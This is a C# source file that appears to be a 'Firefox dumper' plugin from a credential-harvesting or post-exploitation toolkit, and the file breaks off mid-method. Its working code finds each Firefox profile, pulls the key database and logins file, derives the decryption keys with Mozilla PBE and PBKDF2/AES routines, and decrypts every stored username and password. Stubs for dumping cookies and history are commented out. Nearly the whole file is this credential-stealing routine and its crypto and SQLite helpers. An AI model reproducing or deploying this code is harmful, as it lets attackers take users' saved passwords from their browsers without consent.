using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Plugin.Abstractions48;
using Org.BouncyCastle.Asn1;
using System.Security.Cryptography;
using System.Data;

namespace Plugin48Dumper
{
    public class clsFirefoxDumper : clsDumper
    {
        public string BrowserName { get { return "Firefox"; } }
        public DataTable dtHelp = new DataTable();

        private string m_szFirefoxPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\");

        public clsFirefoxDumper()
        {
            Entry = "firefox";
            Description = "Firefox dumper";
            Usage = "firefox <action>";

            dtHelp.Columns.Add("Action");
            dtHelp.Columns.Add("Description");

            dtHelp.Rows.Add("cred", "Dump credentials.");
            dtHelp.Rows.Add("history", "Dump browser history records.");
            dtHelp.Rows.Add("cookie", "Dump browser cookies.");

            Available = Directory.Exists(m_szFirefoxPath);
        }

        public List<clsCredential> fnDumpCredential(int nCount, string szRegex)
        {
            List<clsCredential> ls = new List<clsCredential>();

            try
            {
                List<string> lsDir = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles")).ToList();
                if (lsDir.Count == 0)
                    return ls;

                foreach (string szDir in lsDir)
                {
                    string szDbFilePath = Path.Combine(szDir, "logins.db");
                    string szJsonFilePath = Path.Combine(szDir, "logins.json");
                    if (!File.Exists(szDbFilePath) || !File.Exists(szJsonFilePath))
                        continue;

                    Asn1Der asn1Der = new Asn1Der();
                    bool flag = File.Exists(szDbFilePath) && File.Exists(szJsonFilePath);
                    if (flag)
                    {
                        string[] header = new string[] { "URL", "USERNAME", "PASSWORD" };
                        List<string[]> data = new List<string[]> { };
                        string fileName = Path.Combine("out", "FireFox_password");

                        string userFireFoxdbPath_tempFile = Path.GetTempFileName();
                        File.Copy(szDbFilePath, userFireFoxdbPath_tempFile, true);

                        string userFireFoxloginPath_tempFile = Path.GetTempFileName();
                        File.Copy(szJsonFilePath, userFireFoxloginPath_tempFile, true);

                        byte[] globalSalt = null, dataToParse = null;

                        SQLiteHandler sqlDatabase = new SQLiteHandler(userFireFoxdbPath_tempFile);

                        clsTools.fnLogInfo("A");

                        if (sqlDatabase.ReadTable("metadata"))
                        {
                            clsTools.fnLogInfo("B");
                            for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                            {
                                if (sqlDatabase.GetValue(i, "id") != "password") continue;
                                globalSalt = Convert.FromBase64String(sqlDatabase.GetValue(i, "item1"));
                                try
                                {
                                    dataToParse = Convert.FromBase64String(sqlDatabase.GetValue(i, "item2"));
                                }
                                catch
                                {
                                    dataToParse = Convert.FromBase64String(sqlDatabase.GetValue(i, "item2)"));
                                }
                            }
                        }
                        Asn1DerObject asn = asn1Der.Parse(dataToParse);
                        byte[] array = decryptPEB(asn, Encoding.ASCII.GetBytes(""), globalSalt);

                        Asn1DerObject asn2 = asn1Der.Parse(dataToParse2(userFireFoxdbPath_tempFile));
                        byte[] key = decryptPEB(asn2, Encoding.ASCII.GetBytes(""), globalSalt);

                        using (StreamReader streamReader = new StreamReader(userFireFoxloginPath_tempFile))
                        {
                            string value = streamReader.ReadToEnd();
                            dynamic jsonObject = JsonConvert.DeserializeObject<dynamic>(value);

                            var loginsArray = jsonObject["logins"];

                            if (loginsArray != null)
                            {
                                foreach (var login in loginsArray)
                                {
                                    string hostname = login["hostname"];
                                    string encryptedUsername = login["encryptedUsername"];
                                    string encryptedPassword = login["encryptedPassword"];
                                    long nCreation = (long)login["timeCreated"];
                                    long nLastUsed = (long)login["timeLastUsed"];

                                    clsTools.fnLogInfo(hostname);
                                    clsTools.fnLogInfo(encryptedPassword);

                                    DateTime? dtCreation = fnChromeTimeToDateTime(nCreation);
                                    DateTime? dtLastUsed = fnChromeTimeToDateTime(nLastUsed);

                                    string szCreation = dtCreation == null ? "N/A" : dtCreation?.ToString("F");
                                    string szLastUsed = dtLastUsed == null ? "N/A" : dtLastUsed?.ToString("F");

                                    Asn1DerObject asn1DerObject = asn1Der.Parse(Convert.FromBase64String(encryptedUsername));
                                    Asn1DerObject asn1DerObject2 = asn1Der.Parse(Convert.FromBase64String(encryptedPassword));
                                    string input = DESCBCDecryptor(key, asn1DerObject.objects[0].objects[1].objects[1].Data, asn1DerObject.objects[0].objects[2].Data);
                                    string input2 = DESCBCDecryptor(key, asn1DerObject2.objects[0].objects[1].objects[1].Data, asn1DerObject2.objects[0].objects[2].Data);
                                    string Username = Regex.Replace(input, "[^\\u0020-\\u007F]", "");
                                    string Password = Regex.Replace(input2, "[^\\u0020-\\u007F]", "");

                                    ls.Add(new clsCredential()
                                    {
                                        Url = hostname,
                                        Username = Username,
                                        Password = Password,

                                        Create_Date = szCreation,
                                        Last_Used_Date = szLastUsed,
                                    });
                                }
                            }
                        }

                        File.Delete(userFireFoxdbPath_tempFile);
                        File.Delete(userFireFoxloginPath_tempFile);
                    }
                }
            }
            catch (Exception ex)
            {
                clsTools.fnLogError(ex.Message);
            }

            return ls;
        }

        

        public List<clsCookie> fnDumpCookie(int nCount, string szRegex)
        {
            List<clsCookie> ls = new List<clsCookie>();
            List<string> lsDir = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles")).ToList();
            if (lsDir.Count == 0)
                return ls;

            foreach (string szDir in lsDir)
            {
                string szFilePath = Path.Combine(szDir, "cookies.sqlite");
                if (!File.Exists(szFilePath))
                    continue;

                string szTempPath = fnNewTempFilePath();
                File.Copy(szFilePath, szTempPath);

                /*
                string szConnStr = fnConnString(szTempPath);
                using (var conn = new SQLiteConnection(szConnStr))
                {
                    conn.Open();

                    using (var cmd = new SQLiteCommand(conn))
                    {
                        string szQuery = $"SELECT " +
                           $"CAST(host AS TEXT) AS host, " +
                           $"CAST(name AS TEXT) as name, " +
                           $"CAST(value AS TEXT) as value, " +
                           $"expiry, lastAccessed, creationTime, updateTime " +
                           $"FROM moz_cookies ORDER BY lastAccessed DESC";

                        if (nCount != -1)
                            szQuery += $" LIMIT {nCount}";

                        cmd.CommandText = szQuery;

                        using (var reader = cmd.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                if (reader["host"] == DBNull.Value || reader["name"] == DBNull.Value || reader["value"] == DBNull.Value)
                                    continue;

                                string szHost = (string)reader["host"];
                                string szName = (string)reader["name"];
                                string szValue = (string)reader["value"];

                                long nExpiry = (long)reader["expiry"];
                                long nLastAccessed = (long)reader["lastAccessed"];
                                long nCreation = (long)reader["creationTime"];
                                long nUpdateTime = (long)reader["updateTime"];

                                ls.Add(new clsCookie()
                                {
                                    szHost = szHost,
                                    szName = szName,
                                    szValue = szValue,

                                    szExpiry = fnszChromeDateTime(nExpiry),
                                    szCreation = fnszChromeDateTime(nCreation),
                                    szLastAccessed = fnszChromeDateTime(nLastAccessed),
                                    szUpdated = fnszChromeDateTime(nUpdateTime),
                                });
                            }
                        }
                    }
                }

                */

                File.Delete(szTempPath);
            }

            return ls;
        }

        public List<clsHistory> fnDumpHistory(int nCount, string szRegex)
        {
            List<clsHistory> ls = new List<clsHistory>();
            List<string> lsDir = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles")).ToList();
            if (lsDir.Count == 0)
                return ls;

            foreach (string szDir in lsDir)
            {
                string szFilePath = Path.Combine(szDir, "places.sqlite");
                if (!File.Exists(szFilePath))
                    continue;

                string szTempPath = fnNewTempFilePath();
                File.Copy(szFilePath, szTempPath);

                /*
                string szConnStr = fnConnString(szTempPath);
                using (var conn = new SQLiteConnection(szConnStr))
                {
                    conn.Open();

                    using (var cmd = new SQLiteCommand(conn))
                    {
                        string szQuery = $"SELECT " +
                           $"CAST(url AS TEXT) AS url, " +
                           $"CAST(title AS TEXT) as title, " +
                           $"last_visit_date " +
                           $"FROM moz_places ORDER BY last_visit_date DESC";

                        if (nCount != -1)
                            szQuery += $" LIMIT {nCount}";

                        cmd.CommandText = szQuery;

                        using (var reader = cmd.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                if (reader["url"] == DBNull.Value || reader["title"] == DBNull.Value)
                                    continue;

                                string szUrl = (string)reader["url"];
                                string szTitle = (string)reader["title"];
                                long nLastVisitDate = (long)reader["last_visit_date"];

                                DateTime? dtLastUsed = fnChromeTimeToDateTime(nLastVisitDate);
                                string szLastUsed = dtLastUsed == null ? "N/A" : dtLastUsed?.ToString("F");

                                if (Regex.IsMatch(szUrl, szRegex) ||
                                    Regex.IsMatch(szTitle, szRegex) ||
                                    Regex.IsMatch(szLastUsed, szRegex)
                                )
                                {
                                    ls.Add(new clsHistory()
                                    {
                                        szTitle = szTitle,
                                        szURL = szUrl,
                                        szLastUsed = szLastUsed,
                                    });
                                }
                            }
                        }
                    }
                }
                */

                File.Delete(szTempPath);
            }

            return ls;
        }

        public static string DESCBCDecryptor(byte[] key, byte[] iv, byte[] input)
        {
            string plaintext = null;

            using (TripleDESCryptoServiceProvider tdsAlg = new TripleDESCryptoServiceProvider())
            {
                tdsAlg.Key = key;
                tdsAlg.IV = iv;
                tdsAlg.Mode = CipherMode.CBC;
                tdsAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = tdsAlg.CreateDecryptor(tdsAlg.Key, tdsAlg.IV);

                using (MemoryStream msDecrypt = new MemoryStream(input))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }

            }

            return plaintext;
        }

        public static byte[] DESCBCDecryptorByte(byte[] key, byte[] iv, byte[] input)
        {
            byte[] decrypted = new byte[512];

            using (TripleDESCryptoServiceProvider tdsAlg = new TripleDESCryptoServiceProvider())
            {
                tdsAlg.Key = key;
                tdsAlg.IV = iv;
                tdsAlg.Mode = CipherMode.CBC;
                tdsAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = tdsAlg.CreateDecryptor(tdsAlg.Key, tdsAlg.IV);

                using (MemoryStream msDecrypt = new MemoryStream(input))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        csDecrypt.Read(decrypted, 0, decrypted.Length);
                    }
                }

            }

            return decrypted;
        }

        public byte[] AESDecrypt(byte[] encryptedBytes, byte[] Key, byte[] Vector)
        {
            byte[] array = new byte[32];
            Array.Copy(Key, array, array.Length);
            byte[] array2 = new byte[16];
            Array.Copy(Vector, array2, array2.Length);
            byte[] result = null;
            Rijndael rijndael = Rijndael.Create();
            try
            {
                using (MemoryStream memoryStream = new MemoryStream(encryptedBytes))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(array, array2), CryptoStreamMode.Read))
                    {
                        using (MemoryStream memoryStream2 = new MemoryStream())
                        {
                            byte[] array3 = new byte[1024];
                            int count;
                            while ((count = cryptoStream.Read(array3, 0, array3.Length)) > 0)
                            {
                                memoryStream2.Write(array3, 0, count);
                            }
                            result = memoryStream2.ToArray();
                        }
                    }
                }
            }
            catch
            {
                result = null;
            }
            return result;
        }
        public byte[] byteCpy(byte[] byteSource, byte[] newData)
        {
            byte[] array = new byte[byteSource.Length + newData.Length];
            Array.Copy(byteSource, array, byteSource.Length);
            Array.Copy(newData, 0, array, byteSource.Length, newData.Length);
            return array;
        }

        public byte[] decryptPEB(Asn1DerObject asn, byte[] masterPassword, byte[] globalSalt)
        {
            string oidVal = asn.objects[0].objects[0].objects[0].ToString();
            bool flag = oidVal.Contains("1.2.840.113549.1.12.5.1.3");
            byte[] result = null;
            if (flag)
            {
                byte[] data = asn.objects[0].objects[0].objects[1].objects[0].Data;
                byte[] data2 = asn.objects[0].objects[1].Data;
                MozillaPBE mozillaPBE = new MozillaPBE(globalSalt, Encoding.ASCII.GetBytes(""), data);
                mozillaPBE.Compute();
                byte[] source = DESCBCDecryptorByte(mozillaPBE.Key, mozillaPBE.IV, data2);
                result = source.Skip(0).Take(24).ToArray<byte>();
            }
            else if (oidVal.Contains("1.2.840.113549.1.5.13"))
            {
                byte[] data3 = asn.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
                int iterations = (int)asn.objects[0].objects[0].objects[1].objects[0].objects[1].objects[1].Data[0];

                byte[] password = SHA1.Create().ComputeHash(globalSalt);
                HMACSHA256 algorithm = new HMACSHA256();
                Pbkdf2 pbkdf = new Pbkdf2(algorithm, password, data3, iterations);
                byte[] bytes = pbkdf.GetBytes(32);
                byte[] byteSource = new byte[] { 4, 14 };
                byte[] vector = byteCpy(byteSource, asn.objects[0].objects[0].objects[1].objects[2].objects[1].Data);
                byte[] data4 = asn.objects[0].objects[1].Data;
                byte[] array = AESDecrypt(data4, bytes, vector);
                result = array;
            }
            return result;
        }

        public byte[] dataToParse2(string userFireFoxdbPath_tempFile)
        {
            byte[] a = null;
            SQLiteHandler sqlDatabase = new SQLiteHandler(userFireFoxdbPath_tempFile);
            if (sqlDatabase.ReadTable("nssPrivate"))
            {
                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                {
                    a = Convert.FromBase64String(sqlDatabase.GetValue(i, "a11"));
                }
            }
            return a;
        }

        public class clsHistory
        {
            public string szURL { get; set; }
            public string szTitle { get; set; }
            public string szLastUsed { get; set; }
        }

        public class clsCookie
        {
            public string szHost { get; set; }
            public string szName { get; set; }
            public string szValue { get; set; }

            public string szCreation { get; set; }
            public string szExpiry { get; set; }
            public string szLastAccessed { get; set; }
            public string szUpdated { get; set; }
        }

        public class clsCredential
        {
            public string Url { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
            public string Create_Date { get; set; }
            public string Last_Used_Date { get; set; }
            public string Pass_Time_Chage { get; set; }
            public string Pass_Times_Used { get; set; }
        }

        public class Asn1Der
        {
            public Asn1DerObject Parse(byte[] dataToParse)
            {
                Asn1DerObject asn1DerObject = new Asn1DerObject();
                int i = 0;
                while (i < dataToParse.Length)
                {
                    Asn1Der.Type type = (Asn1Der.Type)dataToParse[i];
                    Asn1Der.Type type2 = type;
                    switch (type2)
                    {
                        case Asn1Der.Type.Integer:
                            {
                                asn1DerObject.objects.Add(new Asn1DerObject
                                {
                                    Type = Asn1Der.Type.Integer,
                                    Lenght = (int)dataToParse[i + 1]
                                });
                                byte[] array = new byte[(int)dataToParse[i + 1]];
                                int length = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
                                Array.Copy(dataToParse, i + 2, array, 0, length);
                                Asn1DerObject[] array2 = asn1DerObject.objects.ToArray();
                                asn1DerObject.objects[array2.Length - 1].Data = array;
                                i = i + 1 + asn1DerObject.objects[array2.Length - 1].Lenght;
                                break;
                            }
                        case Asn1Der.Type.BitString:
                        case Asn1Der.Type.Null:
                            break;
                        case Asn1Der.Type.OctetString:
                            {
                                asn1DerObject.objects.Add(new Asn1DerObject
                                {
                                    Type = Asn1Der.Type.OctetString,
                                    Lenght = (int)dataToParse[i + 1]
                                });
                                byte[] array = new byte[(int)dataToParse[i + 1]];
                                int length = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
                                Array.Copy(dataToParse, i + 2, array, 0, length);
                                Asn1DerObject[] array3 = asn1DerObject.objects.ToArray();
                                asn1DerObject.objects[array3.Length - 1].Data = array;
                                i = i + 1 + asn1DerObject.objects[array3.Length - 1].Lenght;
                                break;
                            }
                        case Asn1Der.Type.ObjectIdentifier:
                            {
                                asn1DerObject.objects.Add(new Asn1DerObject
                                {
                                    Type = Asn1Der.Type.ObjectIdentifier,
                                    Lenght = (int)dataToParse[i + 1]
                                });
                                byte[] array = new byte[(int)dataToParse[i + 1]];
                                int length = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
                                Array.Copy(dataToParse, i + 2, array, 0, length);
                                Asn1DerObject[] array4 = asn1DerObject.objects.ToArray();
                                asn1DerObject.objects[array4.Length - 1].Data = array;
                                i = i + 1 + asn1DerObject.objects[array4.Length - 1].Lenght;
                                break;
                            }
                        default:
                            if (type2 == Asn1Der.Type.Sequence)
                            {
                                bool flag = asn1DerObject.Lenght == 0;
                                byte[] array;
                                if (flag)
                                {
                                    asn1DerObject.Type = Asn1Der.Type.Sequence;
                                    asn1DerObject.Lenght = dataToParse.Length - (i + 2);
                                    array = new byte[asn1DerObject.Lenght];
                                }
                                else
                                {
                                    asn1DerObject.objects.Add(new Asn1DerObject
                                    {
                                        Type = Asn1Der.Type.Sequence,
                                        Lenght = (int)dataToParse[i + 1]
                                    });
                                    array = new byte[(int)dataToParse[i + 1]];
                                }
                                int length = (array.Length > dataToParse.Length - (i + 2)) ? (dataToParse.Length - (i + 2)) : array.Length;
                                Array.Copy(dataToParse, i + 2, array, 0, length);
                                asn1DerObject.objects.Add(this.Parse(array));
                                i = i + 1 + (int)dataToParse[i + 1];
                            }
                            break;
                    }
                IL_2D1:
                    i++;
                    continue;
                    goto IL_2D1;
                }
                return asn1DerObject;
            }

            public static Dictionary<string, string> oidValues = new Dictionary<string, string>
        {
            {
                "2A864886F70D010C050103",
                "1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC"
            },
            {
                "2A864886F70D0307",
                "1.2.840.113549.3.7 des-ede3-cbc"
            },
            {
                "2A864886F70D010101",
                "1.2.840.113549.1.1.1 pkcs-1"
            },
            {
                "2A864886F70D01050D",
                "1.2.840.113549.1.5.13 pkcs5 pbes2"
            },
            {
                "2A864886F70D01050C",
                "1.2.840.113549.1.5.12 pkcs5 PBKDF2"
            },
            {
                "2A864886F70D0209",
                "1.2.840.113549.2.9 hmacWithSHA256"
            },
            {
                "60864801650304012A",
                "2.16.840.1.101.3.4.1.42 aes256-CBC"
            }
        };

            public enum Type
            {
                Sequence = 0x30,
                Integer = 0x02,
                BitString = 0x03,
                OctetString = 0x04,
                Null = 0x05,
                ObjectIdentifier = 0x06
            }
        }

        public class Asn1DerObject
        {
            public Asn1Der.Type Type { get; set; }

            public int Lenght { get; set; }

            public List<Asn1DerObject> objects { get; set; }

            public byte[] Data { get; set; }

            public Asn1DerObject()
            {
                this.objects = new List<Asn1DerObject>();
            }

            public override string ToString()
            {
                StringBuilder stringBuilder = new StringBuilder();
                StringBuilder stringBuilder2 = new StringBuilder();
                Asn1Der.Type type = this.Type;
                Asn1Der.Type type2 = type;
                switch (type2)
                {
                    case Asn1Der.Type.Integer:
                        {
                            foreach (byte b in this.Data)
                            {
                                stringBuilder2.AppendFormat("{0:X2}", b);
                            }
                            StringBuilder stringBuilder3 = stringBuilder;
                            string str = "\tINTEGER ";
                            StringBuilder stringBuilder4 = stringBuilder2;
                            stringBuilder3.AppendLine(str + ((stringBuilder4 != null) ? stringBuilder4.ToString() : null));
                            stringBuilder2 = new StringBuilder();
                            break;
                        }
                    case Asn1Der.Type.BitString:
                    case Asn1Der.Type.Null:
                        break;
                    case Asn1Der.Type.OctetString:
                        foreach (byte b2 in this.Data)
                        {
                            stringBuilder2.AppendFormat("{0:X2}", b2);
                        }
                        stringBuilder.AppendLine("\tOCTETSTRING " + stringBuilder2.ToString());
                        stringBuilder2 = new StringBuilder();
                        break;
                    case Asn1Der.Type.ObjectIdentifier:
                        foreach (byte b3 in this.Data)
                        {
                            stringBuilder2.AppendFormat("{0:X2}", b3);
                        }
                        foreach (KeyValuePair<string, string> keyValuePair in Asn1Der.oidValues)
                        {
                            bool flag = stringBuilder2.ToString().Equals(keyValuePair.Key);
                            if (flag)
                            {
                                stringBuilder.AppendLine("\tOBJECTIDENTIFIER " + keyValuePair.Value);
                            }
                        }
                        stringBuilder2 = new StringBuilder();
                        break;
                    default:
                        if (type2 == Asn1Der.Type.Sequence)
                        {
                            stringBuilder.AppendLine("SEQUENCE {");
                        }
                        break;
                }
                foreach (Asn1DerObject asn1DerObject in this.objects)
                {
                    stringBuilder.Append(asn1DerObject.ToString());
                }
                bool flag2 = this.Type.Equals(Asn1Der.Type.Sequence);
                if (flag2)
                {
                    stringBuilder.AppendLine("\n}");
                }
                return stringBuilder.ToString();
            }
        }

        public class MozillaPBE
        {
            private byte[] GlobalSalt { get; set; }
            private byte[] MasterPassword { get; set; }
            private byte[] EntrySalt { get; set; }
            public byte[] Key { get; private set; }
            public byte[] IV { get; private set; }

            public MozillaPBE(byte[] GlobalSalt, byte[] MasterPassword, byte[] EntrySalt)
            {
                this.GlobalSalt = GlobalSalt;
                this.MasterPassword = MasterPassword;
                this.EntrySalt = EntrySalt;
            }

            public void Compute()
            {
                SHA1 sha = new SHA1CryptoServiceProvider();
                byte[] GLMP; // GlobalSalt + MasterPassword
                byte[] HP; // SHA1(GLMP)
                byte[] HPES; // HP + EntrySalt
                byte[] CHP; // SHA1(HPES)
                byte[] PES; // EntrySalt completed to 20 bytes by zero
                byte[] PESES; // PES + EntrySalt
                byte[] k1;
                byte[] tk;
                byte[] k2;
                byte[] k; // final value conytaining key and iv

                //GLMP
                GLMP = new byte[this.GlobalSalt.Length + this.MasterPassword.Length];
                Array.Copy(this.GlobalSalt, 0, GLMP, 0, this.GlobalSalt.Length);
                Array.Copy(this.MasterPassword, 0, GLMP, this.GlobalSalt.Length, this.MasterPassword.Length);

                //HP
                HP = sha.ComputeHash(GLMP);
                //HPES
                HPES = new byte[HP.Length + this.EntrySalt.Length];
                Array.Copy(HP, 0, HPES, 0, HP.Length);
                Array.Copy(this.EntrySalt, 0, HPES, HP.Length, this.EntrySalt.Length);
                //CHP
                CHP = sha.ComputeHash(HPES);
                //PES
                PES = new byte[20];
                Array.Copy(this.EntrySalt, 0, PES, 0, this.EntrySalt.Length);
                for (int i = this.EntrySalt.Length; i < 20; i++)
                {
                    PES[i] = 0;
                }
                //PESES
                PESES = new byte[PES.Length + this.EntrySalt.Length];
                Array.Copy(PES, 0, PESES, 0, PES.Length);
                Array.Copy(this.EntrySalt, 0, PESES, PES.Length, this.EntrySalt.Length);

                using (HMACSHA1 hmac = new HMACSHA1(CHP))
                {
                    //k1
                    k1 = hmac.ComputeHash(PESES);
                    //tk
                    tk = hmac.ComputeHash(PES);
                    //tkES
                    byte[] tkES = new byte[tk.Length + this.EntrySalt.Length];
                    Array.Copy(tk, 0, tkES, 0, tk.Length);
                    Array.Copy(this.EntrySalt, 0, tkES, tk.Length, this.EntrySalt.Length);
                    //k2
                    k2 = hmac.ComputeHash(tkES);
                }

                //k
                k = new byte[k1.Length + k2.Length];
                Array.Copy(k1, 0, k, 0, k1.Length);
                Array.Copy(k2, 0, k, k1.Length, k2.Length);

                this.Key = new byte[24];

                for (int i = 0; i < this.Key.Length; i++)
                {
                    this.Key[i] = k[i];
                }

                this.IV = new byte[8];
                int j = this.IV.Length - 1;

                for (int i = k.Length - 1; i >= k.Length - this.IV.Length; i--)
                {
                    this.IV[j] = k[i];
                    j--;
                }
            }
        }

        public class Pbkdf2
        {
            //adapted from https://stackoverflow.com/questions/44408355/convert-keyderivation-pbkdf2-in-net-4-5-1-to-net-4-0
            public Pbkdf2(HMAC algorithm, Byte[] password, Byte[] salt, Int32 iterations)
            {
                if (algorithm == null) { throw new ArgumentNullException("algorithm", "Algorithm cannot be null."); }
                if (salt == null) { throw new ArgumentNullException("salt", "Salt cannot be null."); }
                if (password == null) { throw new ArgumentNullException("password", "Password cannot be null."); }
                this.Algorithm = algorithm;
                this.Algorithm.Key = password;
                this.Salt = salt;
                this.IterationCount = iterations;
                this.BlockSize = this.Algorithm.HashSize / 8;
                this.BufferBytes = new byte[this.BlockSize];
            }

            private readonly int BlockSize;
            private uint BlockIndex = 1;

            private byte[] BufferBytes;
            private int BufferStartIndex = 0;
            private int BufferEndIndex = 0;

            public HMAC Algorithm { get; private set; }

            [System.Diagnostics.CodeAnalysis.SuppressMessage("Microsoft.Performance", "CA1819:PropertiesShouldNotReturnArrays", Justification = "Byte array is proper return value in this case.")]
            public Byte[] Salt { get; private set; }

            public Int32 IterationCount { get; private set; }

            public Byte[] GetBytes(int count)
            {
                byte[] result = new byte[count];
                int resultOffset = 0;
                int bufferCount = this.BufferEndIndex - this.BufferStartIndex;

                if (bufferCount > 0)
                { //if there is some data in buffer
                    if (count < bufferCount)
                    { //if there is enough data in buffer
                        Buffer.BlockCopy(this.BufferBytes, this.BufferStartIndex, result, 0, count);
                        this.BufferStartIndex += count;
                        return result;
                    }
                    Buffer.BlockCopy(this.BufferBytes, this.BufferStartIndex, result, 0, bufferCount);
                    this.BufferStartIndex = this.BufferEndIndex = 0;
                    resultOffset += bufferCount;
                }

                while (resultOffset < count)
                {
                    int needCount = count - resultOffset;
                    this.BufferBytes = this.Func();
                    if (needCount > this.BlockSize)
                    { //we one (or more) additional passes
                        Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, this.BlockSize);
                        resultOffset += this.BlockSize;
                    }
                    else
                    {
                        Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, needCount);
                        this.BufferStartIndex = needCount;
                        this.BufferEndIndex = this.BlockSize;
                        return result;
                    }
                }
                return result;
            }

            private byte[] Func()
            {
                var hash1Input = new byte[this.Salt.Length + 4];
                Buffer.BlockCopy(this.Salt, 0, hash1Input, 0, this.Salt.Length);
                Buffer.BlockCopy(GetBytesFromInt(this.BlockIndex), 0, hash1Input, this.Salt.Length, 4);
                var hash1 = this.Algorithm.ComputeHash(hash1Input);

                byte[] finalHash = hash1;
                for (int i = 2; i <= this.IterationCount; i++)
                {
                    hash1 = this.Algorithm.ComputeHash(hash1, 0, hash1.Length);
                    for (int j = 0; j < this.BlockSize; j++)
                    {
                        finalHash[j] = (byte)(finalHash[j] ^ hash1[j]);
                    }
                }
                if (this.BlockIndex == uint.MaxValue) { throw new InvalidOperationException("Derived key too long."); }
                this.BlockIndex += 1;

                return finalHash;
            }

            private static byte[] GetBytesFromInt(uint i)
            {
                var bytes = BitConverter.GetBytes(i);
                if (BitConverter.IsLittleEndian)
                {
                    return new byte[] { bytes[3], bytes[2], bytes[1], bytes[0] };
                }
                else
                {
                    return bytes;
                }
            }

        }
        public class SQLiteHandler
        {
            private readonly byte[] db_bytes;
            private readonly ulong encoding;
            private string[] field_names = new string[1];
            private sqlite_master_entry[] master_table_entries;
            private readonly ushort page_size;
            private readonly byte[] SQLDataTypeSize = { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
            private table_entry[] table_entries;

            public SQLiteHandler(string baseName)
            {
                if (File.Exists(baseName))
                {
                    db_bytes = File.ReadAllBytes(baseName);
                    if (Encoding.UTF8.GetString(db_bytes, 0, 15).CompareTo("SQLite format 3") != 0)
                    {
                        throw new Exception("Not a valid SQLite 3 Database File");
                    }

                    if (db_bytes[0x34] != 0)
                    {
                        throw new Exception("Auto-vacuum capable database is not supported");
                    }

                    //if (decimal.Compare(new decimal(this.ConvertToInteger(0x2c, 4)), 4M) >= 0)
                    //{
                    //    throw new Exception("No supported Schema layer file-format");
                    //}
                    page_size = (ushort)ConvertToInteger(0x10, 2);
                    encoding = ConvertToInteger(0x38, 4);
                    if (decimal.Compare(new decimal(encoding), decimal.Zero) == 0)
                    {
                        encoding = 1L;
                    }

                    ReadMasterTable(100L);
                }
            }

            private ulong ConvertToInteger(int startIndex, int Size)
            {
                if (Size > 8 | Size == 0)
                {
                    return 0L;
                }

                ulong num2 = 0L;
                int num4 = Size - 1;
                for (int i = 0; i <= num4; i++)
                {
                    num2 = num2 << 8 | db_bytes[startIndex + i];
                }

                return num2;
            }

            private long CVL(int startIndex, int endIndex)
            {
                endIndex++;
                byte[] buffer = new byte[8];
                int num4 = endIndex - startIndex;
                bool flag = false;
                if (num4 == 0 | num4 > 9)
                {
                    return 0L;
                }

                if (num4 == 1)
                {
                    buffer[0] = (byte)(db_bytes[startIndex] & 0x7f);
                    return BitConverter.ToInt64(buffer, 0);
                }

                if (num4 == 9)
                {
                    flag = true;
                }

                int num2 = 1;
                int num3 = 7;
                int index = 0;
                if (flag)
                {
                    buffer[0] = db_bytes[endIndex - 1];
                    endIndex--;
                    index = 1;
                }

                int num7 = startIndex;
                for (int i = endIndex - 1; i >= num7; i += -1)
                {
                    if (i - 1 >= startIndex)
                    {
                        buffer[index] = (byte)((byte)(db_bytes[i] >> (num2 - 1 & 7)) & 0xff >> num2 | (byte)(db_bytes[i - 1] << (num3 & 7)));
                        num2++;
                        index++;
                        num3--;
                    }
                    else if (!flag)
                    {
                        buffer[index] = (byte)((byte)(db_bytes[i] >> (num2 - 1 & 7)) & 0xff >> num2);
                    }
                }

                return BitConverter.ToInt64(buffer, 0);
            }

            public int GetRowCount()
            {
                return table_entries.Length;
            }

            public string[] GetTableNames()
            {
                var tableNames = new List<string>();
                int num3 = master_table_entries.Length - 1;
                for (int i = 0; i <= num3; i++)
                {
                    if (master_table_entries[i].item_type == "table")
                    {
                        tableNames.Add(master_table_entries[i].item_name);
                    }
                }

                return tableNames.ToArray();
            }

            public long GetRawID(int row_num)
            {
                if (row_num >= table_entries.Length)
                {
                    return 0;
                }

                return table_entries[row_num].row_id;
            }

            public string GetValue(int row_num, int field)
            {
                if (row_num >= table_entries.Length)
                {
                    return null;
                }

                if (field >= table_entries[row_num].content.Length)
                {
                    return null;
                }

                return table_entries[row_num].content[field];
            }

            public string GetValue(int row_num, string field)
            {
                int num = -1;
                int length = field_names.Length - 1;
                for (int i = 0; i <= length; i++)
                {
                    if (field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
                    {
                        num = i;
